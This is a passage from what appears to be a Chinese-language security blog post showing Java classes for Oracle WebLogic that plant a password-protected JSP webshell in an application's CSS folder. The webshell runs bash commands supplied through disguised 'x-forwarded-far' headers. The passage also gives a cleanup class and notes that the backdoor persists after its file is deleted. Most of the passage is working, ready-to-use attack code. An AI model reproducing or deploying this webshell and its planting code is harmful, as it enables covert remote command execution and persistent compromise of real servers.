</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>w</span><span style=color:#f92672>(</span>File file<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>        File fjsp<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> File<span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>getParent</span><span style=color:#f92672>(),</span><span style=color:#e6db74>&#34;clickjackingScriptbakup_9ik97.jsp&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        PrintWriter writer <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            writer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> PrintWriter<span style=color:#f92672>(</span>fjsp<span style=color:#f92672>.</span><span style=color:#a6e22e>getAbsoluteFile</span><span style=color:#f92672>(),</span> <span style=color:#e6db74>&#34;UTF-8&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//        String jsp=&#34;&lt;% if(\&#34;p4ssw0rd!\&#34;.equals(request.getParameter(\&#34;pwd\&#34;))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\&#34;i\&#34;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\&#34;&lt;pre&gt;\&#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\&#34;&lt;/pre&gt;\&#34;); } %&gt;&#34;;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//betterjsp
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        String jsp<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&lt;% if(\&#34;p4ssw0rd!\&#34;.equals(request.getHeader(\&#34;x-forwarded-fur\&#34;))){ java.io.InputStream in = Runtime.getRuntime().exec(new String[]{\&#34;bash\&#34;,\&#34;-c\&#34;,request.getHeader(\&#34;x-forwarded-far\&#34;)}).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\&#34;&lt;pre&gt;\&#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\&#34;&lt;/pre&gt;\&#34;); } %&gt;&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        writer<span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>jsp<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        writer<span style=color:#f92672>.</span><span style=color:#a6e22e>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=wjspxjava遍历目录卸载jsp木马>wjspx.java：遍历目录卸载jsp木马<a hidden class=anchor aria-hidden=true href=#wjspxjava遍历目录卸载jsp木马>#</a></h2><h3 id=注意点>注意点<a hidden class=anchor aria-hidden=true href=#注意点>#</a></h3><p>可以模拟wjsp.java的做法删除磁盘上的文件，但需要注意：</p><ol><li>如果在删除文件前访问过webshell，jsp文件就已经转成class，路由也添加了。那么在删除文件只是从磁盘上面删除jsp而已，后门还是可以访问的。</li><li>重新上传同名但是内容不同的jsp文件，并不会再编译一次去覆盖已有的class，也就是说无法更新webshell的功能或者密码。</li></ol><h3 id=最终效果-2>最终效果<a hidden class=anchor aria-hidden=true href=#最终效果-2>#</a></h3><p><img loading=lazy src=image-20220701160151632.png alt=image-20220701160151632></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-97-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-97-17>17</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>wjspx</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>wjspx</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>        String deploydir<span style=color:#f92672>=</span>System<span style=color:#f92672>.</span><span style=color:#a6e22e>getProperty</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;oracle.deployed.app.dir&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        loop<span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> File<span style=color:#f92672>(</span>deploydir<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>loop</span><span style=color:#f92672>(</span>File dir<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span><span style=color:#f92672>(</span>File file<span style=color:#f92672>:</span>dir<span style=color:#f92672>.</span><span style=color:#a6e22e>listFiles</span><span style=color:#f92672>()){</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>isFile</span><span style=color:#f92672>()){</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>getAbsolutePath</span><span style=color:#f92672>().</span><span style=color:#a6e22e>endsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/war/pages/css/hineo2.jsp&#34;</span><span style=color:#f92672>)){</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>delete</span><span style=color:#f92672>();}</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span><span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>isDirectory</span><span style=color:#f92672>()){</span>
</span></span><span style=display:flex><span>                loop<span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>getAbsoluteFile</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=wjsp2java精准定位临时目录写jsp木马>wjsp2.java：精准定位临时目录写jsp木马<a hidden class=anchor aria-hidden=true href=#wjsp2java精准定位临时目录写jsp木马>#</a></h2><h3 id=探索过程-1>探索过程<a hidden class=anchor aria-hidden=true href=#探索过程-1>#</a></h3><p>在探索实现 wjsp.java 时我们提到，还有 <code>oam_server/xrd2uw/</code> 这一段路径是未知的。</p><p>在学习编写内存马的过程中我发现通过当前请求的上下文可以得到这一段路径。那么拼接起来就可以得到完整的css路径，精准写入目标文件夹了。</p><p><img loading=lazy src=image-20220701152336737.png alt=image-20220701152336737></p><p><img loading=lazy src=image-20220701152411195.png alt=image-20220701152411195></p><p>可以通过 <code>getTempPath()</code> 精准定位到临时目录的位置是 <code>oam_server/xrd2uw</code></p><p>加上<code>System.getProperty("oracle.deployed.app.dir")</code> 获取到的 <code>"/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user"</code></p><p>拼接起来，就能精准得到路径 <code>"/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam_server/xrd2uw/war/pages/css"</code></p><p>非常完美，避免了wjsp.java里面那种不优雅的到处写jsp的方法。</p><h3 id=优缺点-2>优缺点<a hidden class=anchor aria-hidden=true href=#优缺点-2>#</a></h3><p>优点</p><ol><li>可以精准往想要的未知写入jsp文件，避免了因为部署差异导致失败</li></ol><p>缺点</p><ol start=2><li>存在环境不确定性，可能因为不同版本代码写法不同导致获取不到request对象</li></ol><h3 id=最终效果-3>最终效果<a hidden class=anchor aria-hidden=true href=#最终效果-3>#</a></h3><p><img loading=lazy src=image-20220701155401195.png alt=image-20220701155401195></p><p><img loading=lazy src=image-20220701155347316.png alt=image-20220701155347316></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-98-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-98-40>40</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.internal.HttpConnectionHandler<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.provider.ContainerSupportProviderImpl<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.work.ExecuteThread<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>wjsp2</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>wjsp2</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>        String deploydir<span style=color:#f92672>=</span>System<span style=color:#f92672>.</span><span style=color:#a6e22e>getProperty</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;oracle.deployed.app.dir&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Field</span> field <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        HttpConnectionHandler httpConn <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span> gcw <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span><span style=color:#f92672>)</span> <span style=color:#f92672>((</span>ExecuteThread<span style=color:#f92672>)</span> Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>currentThread</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getCurrentWork</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            field <span style=color:#f92672>=</span> gcw<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;connectionHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            field<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            httpConn <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HttpConnectionHandler<span style=color:#f92672>)</span> field<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>gcw<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            String temppath <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getContext</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getTempPath</span><span style=color:#f92672>().</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            File csspath<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> File<span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> File<span style=color:#f92672>(</span>deploydir<span style=color:#f92672>,</span>temppath<span style=color:#f92672>),</span><span style=color:#e6db74>&#34;war/pages/css/login_page.css&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            w<span style=color:#f92672>(</span>csspath<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>w</span><span style=color:#f92672>(</span>File file<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>        File fjsp<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> File<span style=color:#f92672>(</span>file<span style=color:#f92672>.</span><span style=color:#a6e22e>getParent</span><span style=color:#f92672>(),</span><span style=color:#e6db74>&#34;hineo4.jsp&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        PrintWriter writer <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            writer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> PrintWriter<span style=color:#f92672>(</span>fjsp<span style=color:#f92672>.</span><span style=color:#a6e22e>getAbsoluteFile</span><span style=color:#f92672>(),</span> <span style=color:#e6db74>&#34;UTF-8&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        String jsp<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&lt;% if(\&#34;p4ssw0rd!\&#34;.equals(request.getHeader(\&#34;x-forwarded-fur\&#34;))){ java.io.InputStream in = Runtime.getRuntime().exec(new String[]{\&#34;bash\&#34;,\&#34;-c\&#34;,request.getHeader(\&#34;x-forwarded-far\&#34;)}).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\&#34;&lt;pre&gt;\&#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\&#34;&lt;/pre&gt;\&#34;); } %&gt;&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        writer<span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>jsp<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        writer<span style=color:#f92672>.</span><span style=color:#a6e22e>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
